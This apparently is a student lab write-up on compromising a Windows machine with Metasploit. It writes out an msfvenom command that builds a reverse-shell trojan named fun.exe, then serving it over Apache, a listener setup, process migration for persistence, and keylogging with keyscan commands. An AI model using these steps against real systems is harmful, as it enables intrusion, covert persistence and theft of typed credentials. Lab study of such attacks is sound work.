# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

![Alt text](<Screenshot at 2026-11-17 04-47-14.png>)

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

![Alt text](<Screenshot at 2026-11-25 17-11-34.png>)

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

![Alt text](<Screenshot at 2026-11-19 04-53-43.png>)

Start apache server
sudo systemctl apache2 start
## OUTPUT:

![Alt text](<Screenshot at 2026-11-19 04-52-52.png>)

Check the status of apache2
## OUTPUT:

![Alt text](<Screenshot at 2026-11-19 04-51-38.png>)

Invoke msfconsole:
## OUTPUT:
![Alt text](<Screenshot at 2026-11-25 17-22-02.png>)



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
![Alt text](<Screenshot at 2026-11-19 04-58-51.png>)


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

![Alt text](<Screenshot at 2026-11-24 04-20-25.png>)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:

![Alt text](<Screenshot at 2026-11-25 17-43-30.png>)

Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

![Alt text](<Screenshot at 2026-11-25 17-45-10.png>)

On kali/parrot give the command exploit
## OUTPUT:

![Alt text](<Screenshot at 2026-11-25 17-46-42.png>)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:

![Alt text](<Screenshot at 2026-11-25 17-50-52.png>)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:
migrate -N explorer.exe

at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:

![Alt text](<Screenshot at 2026-11-25 18-15-14.png>)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:

<img width="322" height="41" alt="image" src="https://github.com/user-attachments/assets/5e48c090-0030-4412-b47d-917a016c9087" />





keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:
<img width="1356" height="172" alt="image" src="https://github.com/user-attachments/assets/c6fbf71c-20a9-48d4-9b4f-1d5c919a50a7" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

